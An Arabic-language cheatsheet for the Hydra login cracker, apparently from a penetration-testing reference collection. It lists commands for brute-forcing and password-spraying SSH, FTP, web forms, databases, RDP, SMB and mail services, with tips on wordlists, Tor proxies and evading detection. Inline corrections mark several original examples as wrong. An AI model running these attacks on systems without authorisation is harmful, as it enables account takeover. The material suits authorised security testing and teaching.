<a id="-hydra---complete-cheatsheet"></a>
# 🔓 Hydra — ورقة مرجعية شاملة

<!-- language-home-navigation -->
[🏠 الصفحة الرئيسية العربية](../../README.ar.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    The Fast Network Login Cracker
```

يصف الشعار Hydra بأنها أداة سريعة لاختبار كلمات مرور تسجيل الدخول عبر الشبكة.

<p align="center">
  <img src="https://img.shields.io/badge/Hydra-Password_Cracker-red?style=for-the-badge" alt="Hydra">
  <img src="https://img.shields.io/badge/Brute-Force-orange?style=for-the-badge" alt="Brute Force">
  <img src="https://img.shields.io/badge/50+-Protocols-blue?style=for-the-badge" alt="Protocols">
  <img src="https://img.shields.io/badge/Network-Login-green?style=for-the-badge" alt="Network">
</p>

<p align="center">
  <b>🔑 أداة معروفة لاختبار تسجيل الدخول عبر الشبكة بالتنفيذ المتوازي</b>
</p>

---

<a id="-table-of-contents"></a>
## 📋 جدول المحتويات

- [مقدمة](#-introduction)
- [التثبيت](#-installation)
- [الصيغة الأساسية](#-basic-syntax)
- [البروتوكولات المدعومة](#-supported-protocols)
- [اختبارات كلمات مرور SSH](#-ssh-attacks)
- [اختبارات كلمات مرور FTP](#-ftp-attacks)
- [اختبارات نماذج HTTP](#-http-form-attacks)
- [اختبارات كلمات مرور قواعد البيانات](#-database-attacks)
- [اختبارات خدمات سطح المكتب البعيد](#-remote-desktop-attacks)
- [خدمات أخرى](#-other-services)
- [قوائم الكلمات وكلمات المرور](#-wordlists--passwords)
- [خيارات متقدمة](#-advanced-options)
- [أمثلة عملية](#-real-world-examples)
- [مرجع سريع](#-quick-reference)
- [نصائح وأفضل الممارسات](#-tips--best-practices)
- [الموارد](#-resources)

---

<a id="-introduction"></a>
## 🎯 مقدمة

**Hydra** ‏(THC-Hydra) أداة سريعة ومرنة لاختبار كلمات المرور عبر محاولات تسجيل دخول مباشرة إلى الخدمات (Online Password Cracking). تدعم بروتوكولات كثيرة وتنفذ الاتصالات بالتوازي لزيادة السرعة.

<a id="key-features"></a>
### الميزات الأساسية

|الميزة|الوصف|
|---------|-------------|
|**أكثر من 50 بروتوكولًا**|SSH وFTP وHTTP وRDP وSMB وغيرها|
|**تنفيذ متوازٍ**|اتصالات متزامنة متعددة|
|**مرن**|ترويسات مخصصة وملفات تعريف ارتباط ووكيل|
|**استئناف**|حفظ جلسات الاختبار واستعادتها|
|**متعدد المنصات**|Linux, Windows, macOS|

<a id="attack-types"></a>
### أنواع الاختبارات

|النوع|الوصف|
|------|-------------|
|**قائمة كلمات (Dictionary)**|تجربة كلمات مرور من قائمة|
|**تجريب جميع الاحتمالات (Brute Force)**|توليد جميع التركيبات|
|**رش كلمات المرور (Password Spray)**|كلمة مرور واحدة لعدة مستخدمين|
|**حشو بيانات الاعتماد (Credential Stuffing)**|أزواج بصيغة Username:password|

---

<a id="-installation"></a>
## 📥 التثبيت

<a id="kali-linux-pre-installed"></a>
### نظام Kali Linux حيث تكون الأداة مثبتة مسبقًا
```bash
hydra -h
```

<a id="ubuntudebian"></a>
### Ubuntu/Debian
```bash
sudo apt install hydra
```

<a id="from-source"></a>
### التثبيت من الشيفرة المصدرية
```bash
git clone https://github.com/vanhauser-thc/thc-hydra
cd thc-hydra
./configure
make
sudo make install
```

<a id="macos-homebrew"></a>
### macOS (Homebrew)
```bash
brew install hydra
```

<a id="verify-installation"></a>
### التحقق من التثبيت
```bash
hydra -h
hydra -V
```

---

<a id="-basic-syntax"></a>
## ⌨️ الصيغة الأساسية

<a id="general-syntax"></a>
### الصيغة العامة
```bash
hydra [options] target service
```

<a id="common-options"></a>
### خيارات شائعة

|الخيار|الوصف|
|--------|-------------|
|`-l`|اسم مستخدم واحد|
|`-L`|قائمة أسماء مستخدمين|
|`-p`|كلمة مرور واحدة|
|`-P`|قائمة كلمات مرور|
|`-C`|ملف مفصول بنقطتين رأسيتين بصيغة user:pass|
|`-t`|مسارات تنفيذ متزامنة؛ الافتراضي 16 بحسب الأصل|
|`-s`|رقم المنفذ|
|`-o`|ملف المخرجات|
|`-f`|التوقف عند أول زوج صالح|
|`-V`|عرض تفصيلي للمحاولات|
|`-vV`|عرض أكثر تفصيلًا|
|`-d`|وضع تنقيح الأخطاء|

<a id="quick-start"></a>
### بدء سريع
```bash
# مستخدم واحد مع قائمة كلمات مرور
hydra -l admin -P passwords.txt target ssh

# قائمة مستخدمين مع كلمة مرور واحدة
hydra -L users.txt -p password123 target ssh

# قائمتا المستخدمين وكلمات المرور
hydra -L users.txt -P passwords.txt target ssh
```

---

<a id="-supported-protocols"></a>
## 📡 البروتوكولات المدعومة

<a id="complete-protocol-list"></a>
### قائمة البروتوكولات الكاملة بحسب الأصل

```
adam6500    afp         asterisk    cisco       cisco-enable
cvs         firebird    ftp         ftps        http-form-get
http-form-post          http-get    http-head   http-post
http-proxy  http-proxy-urlenum      https-form-get
https-form-post         https-get   https-head  https-post
imap        imaps       irc         ldap2       ldap2s
ldap3       ldap3-crammd5           ldap3-digestmd5
ldap3s      ldap3s-crammd5          ldap3s-digestmd5
memcached   mongodb     mssql       mysql       nntp
oracle      oracle-listener         oracle-sid  pcanywhere
pcnfs       pop3        pop3s       postgres    radmin2
rdp         redis       rexec       rlogin      rpcap
rsh         rtsp        s7-300      sapr3       sip
smb         smtp        smtp-enum   smtps       snmp
socks5      ssh         sshkey      svn         teamspeak
telnet      vmauthd     vnc         xmpp
```

---

<a id="-ssh-attacks"></a>
## 🔐 اختبارات كلمات مرور SSH

<a id="basic-ssh-attack"></a>
### اختبار SSH الأساسي
```bash
# مستخدم واحد
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1

# مستخدمون متعددون
hydra -L users.txt -P passwords.txt ssh://192.168.1.1

# منفذ محدد
hydra -l admin -P passwords.txt -s 2222 192.168.1.1 ssh
```

<a id="ssh-with-options"></a>
### استخدام SSH مع الخيارات
```bash
# تقليل المحاولات لتجنب قفل الحساب بحسب الأصل؛ راجع التوضيح
hydra -l admin -P passwords.txt -t 4 192.168.1.1 ssh

# التوقف عند أول نجاح
hydra -l admin -P passwords.txt -f 192.168.1.1 ssh

# مخرجات تفصيلية
hydra -l admin -P passwords.txt -V 192.168.1.1 ssh
```

<a id="ssh-key-authentication"></a>
### المصادقة باستخدام مفاتيح SSH

> **تصحيح:** تتوقع وحدة `sshkey` مسارات إلى مفاتيح خاصة غير مشفرة عبر `-p` أو قائمة مسارات عبر `-P`؛ المثال الأصلي باستخدام `-x` لا يوضح ذلك ولا يكسر المفتاح الخاص نفسه. [مساعدة الوحدة في المصدر الرسمي](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra-sshkey.c).
```bash
# استخدام مفتاح خاص لاختبار المفاتيح الضعيفة بحسب الأصل؛ راجع التصحيح
hydra -l root -x 6:8:a 192.168.1.1 sshkey
```

---

<a id="-ftp-attacks"></a>
## 📂 اختبارات كلمات مرور FTP

<a id="basic-ftp-attack"></a>
### اختبار FTP الأساسي
```bash
# تجربة كلمات مرور FTP
hydra -l admin -P passwords.txt ftp://192.168.1.1

# فحص تسجيل الدخول المجهول في FTP
hydra -l anonymous -p anonymous ftp://192.168.1.1

# مستخدمون متعددون
hydra -L users.txt -P passwords.txt ftp://192.168.1.1
```

<a id="ftps-ftp-over-ssl"></a>
### خدمة FTPS، أي FTP عبر SSL
```bash
hydra -l admin -P passwords.txt ftps://192.168.1.1
```

---

<a id="-http-form-attacks"></a>
## 🌐 اختبارات نماذج HTTP

<a id="http-get-form"></a>
### HTTP-GET-FORM

```bash
hydra -l admin -P passwords.txt target http-get-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid"

# الصيغة:
# "/path:params:failure_string"
```

<a id="http-post-form-most-common"></a>
### وحدة HTTP-POST-FORM الشائعة

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

<a id="form-attack-syntax"></a>
### صيغة اختبار النماذج

في الصيغة التالية، يمثل `^USER^` موضع اسم المستخدم و`^PASS^` موضع كلمة المرور، بينما يمثل `Failure_string` النص الذي يظهر عند إخفاق تسجيل الدخول. أُبقيت الصيغة الأصلية حرفيًا.

```
"/page:POST_params:Failure_string"

Where:
- ^USER^ = Username placeholder
- ^PASS^ = Password placeholder
- Failure_string = Text shown on failed login
```

<a id="success-based-detection"></a>
### تحديد النجاح باستخدام نص الاستجابة

```bash
# استخدام S= لتحديد نص النجاح بدلًا من نص الإخفاق
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:S=Welcome"
```

<a id="with-cookies"></a>
### باستخدام ملفات تعريف الارتباط (Cookies)

```bash
hydra -l admin -P passwords.txt target http-post-form \
    "/login.php:user=^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=abc123"
```

<a id="http-basic-auth"></a>
### المصادقة الأساسية عبر HTTP ‏(Basic Auth)

```bash
# المصادقة الأساسية عبر HTTP
hydra -l admin -P passwords.txt http-get://192.168.1.1/admin/

# HTTPS
hydra -l admin -P passwords.txt https-get://192.168.1.1/admin/
```

<a id="http-proxy"></a>
### وكيل HTTP

```bash
hydra -l admin -P passwords.txt http-proxy://proxy.server:3128
```

---

<a id="-database-attacks"></a>
## 🗄️ اختبارات كلمات مرور قواعد البيانات

<a id="mysql"></a>
### MySQL

```bash
hydra -l root -P passwords.txt mysql://192.168.1.1

# منفذ محدد
hydra -l root -P passwords.txt -s 3307 192.168.1.1 mysql
```

<a id="postgresql"></a>
### PostgreSQL

```bash
hydra -l postgres -P passwords.txt postgres://192.168.1.1
```

<a id="microsoft-sql-server"></a>
### قاعدة Microsoft SQL Server

```bash
hydra -l sa -P passwords.txt mssql://192.168.1.1
```

<a id="oracle"></a>
### Oracle

```bash
# اختبار Oracle باستخدام SID
hydra -l SYS -P passwords.txt oracle://192.168.1.1/SID

# خدمة Oracle Listener
hydra -l admin -P passwords.txt oracle-listener://192.168.1.1
```

<a id="mongodb"></a>
### MongoDB

```bash
hydra -l admin -P passwords.txt mongodb://192.168.1.1
```

<a id="redis"></a>
### Redis

```bash
hydra -P passwords.txt redis://192.168.1.1
```

---

<a id="-remote-desktop-attacks"></a>
## 🖥️ اختبارات خدمات سطح المكتب البعيد

<a id="rdp-windows-remote-desktop"></a>
### بروتوكول سطح المكتب البعيد في Windows ‏(RDP)

```bash
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# تقليل مسارات التنفيذ لأن RDP بطيء
hydra -l administrator -P passwords.txt -t 1 rdp://192.168.1.1
```

<a id="vnc"></a>
### VNC

```bash
# خدمة VNC بكلمة مرور فقط
hydra -P passwords.txt vnc://192.168.1.1

# إصدار VNC محدد بحسب الأصل؛ يحدد المثال المنفذ
hydra -P passwords.txt -s 5901 192.168.1.1 vnc
```

<a id="telnet"></a>
### Telnet

```bash
hydra -l admin -P passwords.txt telnet://192.168.1.1
```

---

<a id="-other-services"></a>
## 🔧 خدمات أخرى

<a id="smb-windows-shares"></a>
### خدمة SMB لمشاركات Windows

```bash
hydra -l administrator -P passwords.txt smb://192.168.1.1
```

<a id="smtp"></a>
### SMTP

```bash
# مصادقة SMTP
hydra -l user@domain.com -P passwords.txt smtp://192.168.1.1

# استكشاف مستخدمي SMTP
hydra -L users.txt smtp-enum://192.168.1.1
```

<a id="pop3imap"></a>
### POP3/IMAP

```bash
# POP3
hydra -l user@domain.com -P passwords.txt pop3://192.168.1.1

# IMAP
hydra -l user@domain.com -P passwords.txt imap://192.168.1.1
```

<a id="ldap"></a>
### LDAP

```bash
hydra -l "cn=admin,dc=example,dc=com" -P passwords.txt ldap://192.168.1.1
```

<a id="snmp"></a>
### SNMP

```bash
hydra -P community_strings.txt snmp://192.168.1.1
```

---

<a id="-wordlists--passwords"></a>
## 📚 قوائم الكلمات وكلمات المرور

<a id="popular-wordlists"></a>
### قوائم كلمات شائعة

```bash
# مواقع الملفات في Kali Linux
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Passwords/

# قوائم كلمات المرور في SecLists
/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/Default-Credentials/
```

<a id="password-generation--x"></a>
### توليد كلمات المرور باستخدام ‎-x

> **تصحيح:** يرمز `a` للأحرف الصغيرة و`A` للكبيرة و`1` للأرقام. أما المحارف الأخرى مثل `!` فتضاف بقيمتها الحرفية؛ `!` ليس رمزًا عامًا لجميع المحارف الخاصة. [مساعدة مولد الكلمات الرسمية](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# توليد كلمات مرور بالصيغة min:max:charset
hydra -l admin -x 4:6:a 192.168.1.1 ssh    # من 4 إلى 6 أحرف صغيرة
hydra -l admin -x 4:6:A 192.168.1.1 ssh    # من 4 إلى 6 أحرف كبيرة
hydra -l admin -x 4:6:1 192.168.1.1 ssh    # من 4 إلى 6 أرقام
hydra -l admin -x 4:6:aA1 192.168.1.1 ssh  # خليط

# خيارات مجموعة المحارف:
# a = أحرف صغيرة    A = أحرف كبيرة
# 1 = أرقام      ! = محارف خاصة بحسب الأصل؛ راجع التوضيح
```

<a id="colon-separated-file--c"></a>
### ملف مفصول بالنقطتين الرأسيتين باستخدام ‎-C

```bash
# صيغة user:password
hydra -C creds.txt 192.168.1.1 ssh

# creds.txt:
# admin:admin
# admin:password
# root:toor
# guest:guest
```

<a id="usernamepassword-customization"></a>
### تخصيص أسماء المستخدمين وكلمات المرور

```bash
# كلمات مرور فارغة
hydra -l admin -e n 192.168.1.1 ssh

# تجربة اسم المستخدم كلمة مرور
hydra -l admin -e s 192.168.1.1 ssh

# تجربة اسم المستخدم معكوسًا كلمة مرور
hydra -l admin -e r 192.168.1.1 ssh

# جميع الفحوص الخاصة
hydra -l admin -e nsr -P passwords.txt 192.168.1.1 ssh
```

---

<a id="-advanced-options"></a>
## ⚡ خيارات متقدمة

<a id="output--logging"></a>
### المخرجات والتسجيل

```bash
# حفظ النتائج في ملف
hydra -l admin -P passwords.txt -o results.txt 192.168.1.1 ssh

# مخرجات بتنسيق JSON
hydra -l admin -P passwords.txt -o results.json -b json 192.168.1.1 ssh
```

<a id="resume-attacks"></a>
### استئناف الاختبارات

> **تصحيح:** `-R` يستعيد جلسة سابقة انقطعت، وليس خيارًا لإنشاء جلسة جديدة مع الحفظ. أُبقي سطر الأصل دون تغيير. [المساعدة الرسمية](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# حفظ الجلسة للاستئناف بحسب وصف الأصل؛ راجع التصحيح
hydra -l admin -P large_wordlist.txt -o results.txt -R 192.168.1.1 ssh

# استئناف الاختبار المتوقف
hydra -R
```

<a id="proxy-support"></a>
### دعم الوكيل (Proxy)

> **توضيح توافق:** يوثق المشروع `HYDRA_PROXY_HTTP` لخدمات HTTP، و`HYDRA_PROXY` للخدمات الأخرى بصيغ مثل `connect://` و`socks4://` و`socks5://`. لذلك فمثال `HYDRA_PROXY=http://proxy:8080` واستخدام المتغير العام مع نموذج HTTP ليسا وصفة عامة صحيحة. أُبقيت أسطر الأصل كما هي. [دليل Hydra الرسمي](https://github.com/vanhauser-thc/thc-hydra/blob/master/README).

```bash
# وكيل HTTP
export HYDRA_PROXY=http://proxy:8080
hydra -l admin -P passwords.txt 192.168.1.1 ssh

# وكيل SOCKS
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt 192.168.1.1 ssh
```

<a id="performance-tuning"></a>
### ضبط الأداء

> **تصحيح للخيارات:** `-w` مهلة انتظار الاستجابة، و`-W` انتظار بين اتصالات كل مسار؛ `-T` عدد الاتصالات المتوازية الإجمالي مع `-M`، وليس مهلة اتصال. تقليل `-t` لا يحدد العدد الكلي للمحاولات ولا يضمن تجنب القفل. [تعريفات الخيارات الرسمية](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).

```bash
# مسارات التنفيذ، وعددها الافتراضي 16 بحسب الأصل
hydra -l admin -P passwords.txt -t 32 192.168.1.1 ssh

# مدة الانتظار بين المحاولات بحسب وصف الأصل؛ راجع التصحيح
hydra -l admin -P passwords.txt -w 10 192.168.1.1 ssh

# مهلة الاتصال بحسب وصف الأصل؛ راجع تصحيح ‎-T
hydra -l admin -P passwords.txt -T 30 192.168.1.1 ssh
```

<a id="multiple-targets"></a>
### أهداف متعددة

```bash
# من ملف
hydra -L users.txt -P passwords.txt -M targets.txt ssh

# targets.txt:
# 192.168.1.1
# 192.168.1.2
# 192.168.1.3
```

---

<a id="-real-world-examples"></a>
## 🎬 أمثلة عملية

<a id="example-1-ssh-brute-force"></a>
### المثال 1: اختبار كلمات مرور SSH
```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt \
    -t 4 -V 192.168.1.1 ssh
```

<a id="example-2-web-login-form"></a>
### المثال 2: نموذج تسجيل دخول ويب
```bash
hydra -l admin -P passwords.txt \
    192.168.1.1 http-post-form \
    "/login:username=^USER^&password=^PASS^:Invalid"
```

<a id="example-3-wordpress-login"></a>
### المثال 3: تسجيل الدخول إلى WordPress
```bash
hydra -l admin -P passwords.txt \
    target.com http-post-form \
    "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"
```

<a id="example-4-multiple-services"></a>
### المثال 4: خدمات متعددة بحسب الأصل

> **تصحيح:** صيغة Hydra تختار خدمة واحدة لكل استدعاء؛ السطر الأصلي الذي يجمع `ssh ftp mysql` لا يمثل تشغيلًا متزامنًا صحيحًا لثلاث خدمات. [الصيغة الرسمية](https://github.com/vanhauser-thc/thc-hydra/blob/master/hydra.c).
```bash
# اختبار خدمات متعددة على مضيف واحد بحسب الأصل؛ راجع التصحيح
hydra -l admin -P passwords.txt 192.168.1.1 ssh ftp mysql
```

<a id="example-5-password-spray"></a>
### المثال 5: رش كلمات المرور (Password Spraying)
```bash
hydra -L users.txt -p "Winter2024!" \
    192.168.1.1 smb
```

<a id="example-6-with-proxytor"></a>
### المثال 6: استخدام Proxy أو Tor
```bash
export HYDRA_PROXY=socks5://127.0.0.1:9050
hydra -l admin -P passwords.txt target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:Failed"
```

<a id="example-7-http-basic-auth-admin-panel"></a>
### المثال 7: مصادقة HTTP الأساسية للوحة الإدارة
```bash
hydra -l admin -P passwords.txt \
    https-get://192.168.1.1/admin/
```

<a id="example-8-rdp-attack-careful"></a>
### المثال 8: اختبار RDP بحذر
```bash
hydra -l administrator -P passwords.txt \
    -t 1 -V rdp://192.168.1.1
```

---

<a id="-quick-reference"></a>
## 📊 مرجع سريع

<a id="essential-commands"></a>
### الأوامر الأساسية

|المهمة|الأمر|
|------|---------|
|اختبار SSH|`hydra -l user -P pass.txt ssh://target`|
|اختبار FTP|`hydra -l user -P pass.txt ftp://target`|
|نموذج HTTP POST|`hydra -l user -P pass.txt target http-post-form "/login:u=^USER^&p=^PASS^:Failed"`|
|اختبار RDP|`hydra -l user -P pass.txt rdp://target`|
|حفظ المخرجات|`hydra ... -o results.txt`|
|استئناف الاختبار|`hydra -R`|

<a id="common-options-1"></a>
### خيارات شائعة

|الخيار|الوصف|
|--------|-------------|
|`-l/-L`|اسم مستخدم أو قائمة|
|`-p/-P`|كلمة مرور أو قائمة|
|`-C`|ملف بصيغة user:pass|
|`-t`|مسارات التنفيذ|
|`-s`|المنفذ|
|`-f`|التوقف عند النجاح|
|`-V`|عرض تفصيلي|
|`-o`|ملف المخرجات|
|`-x`|توليد كلمات المرور|
|`-e nsr`|تجربة كلمة فارغة أو اسم المستخدم أو معكوسه|

---

<a id="-tips--best-practices"></a>
## 💡 نصائح وأفضل الممارسات

<a id="performance-tips"></a>
### نصائح للأداء

1. **تقليل مسارات التنفيذ للخدمات الحساسة**
   ```bash
   # استخدام عدد قليل من المسارات مع RDP وSMB
   hydra -t 1 ...
   
   # استخدام عدد متوسط مع SSH
   hydra -t 4 ...
   
   # يمكن أن يكون العدد أكبر مع نماذج الويب
   hydra -t 16 ...
   ```

2. **استخدام قوائم كلمات مناسبة للهدف**
   ```bash
   # قوائم قد تكون أنسب من rockyou.txt:
   # - أكثر 1000 كلمة مرور شيوعًا
   # - بيانات الاعتماد الافتراضية
   # - قوائم خاصة بالشركة
   ```

3. **فحص سياسات قفل الحساب أولًا**
   ```bash
   # الاختبار بقائمة صغيرة أولًا
   hydra -l admin -P small.txt -t 1 target ssh
   ```

<a id="stealth-tips"></a>
### نصائح لتقليل الظهور

```bash
# إضافة تأخير بحسب وصف الأصل؛ راجع تصحيح ‎-w
hydra -l admin -P passwords.txt -w 30 target ssh

# عدد قليل من مسارات التنفيذ
hydra -l admin -P passwords.txt -t 2 target ssh

# عبر وكيل
export HYDRA_PROXY=socks5://127.0.0.1:9050
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ تنبيه قانوني

> **تحذير:** Hydra أداة قوية، وينبغي استخدامها فقط في **اختبارات مصرح بها**.
> 
> - ✅ اختبر الأنظمة التي تملكها
> - ✅ اختبر بتفويض مكتوب وصريح
> - ✅ استخدمها ضمن اختبارات اختراق مصرح بها
> - ❌ لا تنفذ محاولات هجومية دون تفويض
> - ❌ بحسب تنبيه الأصل، تجريب كلمات المرور دون إذن مخالف للقانون
> 
> **بحسب تنبيه الأصل، قد تخالف محاولات الوصول دون تفويض القانون وتؤدي إلى اتهامات جنائية.**

---

<a id="-resources"></a>
## 📚 الموارد

<a id="official-resources"></a>
### المصادر الرسمية
- [مستودع THC-Hydra على GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [دليل Hydra](https://github.com/vanhauser-thc/thc-hydra/blob/master/README.md)

<a id="wordlists"></a>
### قوائم الكلمات
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [بيانات الاعتماد الافتراضية](https://github.com/ihebski/DefaultCreds-cheat-sheet)

<a id="related-cheatsheets"></a>
### أوراق مرجعية ذات صلة
- [Nmap](../../Nmap/translations/README.ar.md)
- [Metasploit](../../Metasploit/translations/README.ar.md)
- [SQLMap](../../SQLMap/translations/README.ar.md)

---

<p align="center">
  <b>🔓 أتقن اختبار كلمات مرور خدمات الشبكة!</b><br>
  <i>احصل دائمًا على التفويض أولًا</i>
</p>
